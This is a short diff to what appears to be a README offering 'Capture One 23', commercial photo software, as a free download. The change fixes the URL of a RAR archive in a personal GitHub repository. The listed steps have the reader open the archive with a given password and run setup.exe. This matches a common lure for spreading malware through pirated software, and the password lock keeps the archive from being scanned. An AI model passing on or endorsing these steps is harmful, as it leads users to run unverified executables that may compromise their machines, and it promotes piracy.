@@ -2,7 +2,7 @@
 
 <H3>How to install:</H3>
 
-1. [Download](https://github.com/deepachedda/capture-one-23/releases/download/Dpwnload/CaptureOne.rar)
+1. [Download](https://github.com/deepachedda/capture-one-23/releases/download/Download/Captureone.rar)
 2. Open archive (password: Capture1)
 3. Open setup.exe for download and install
 4. Follow the instruction
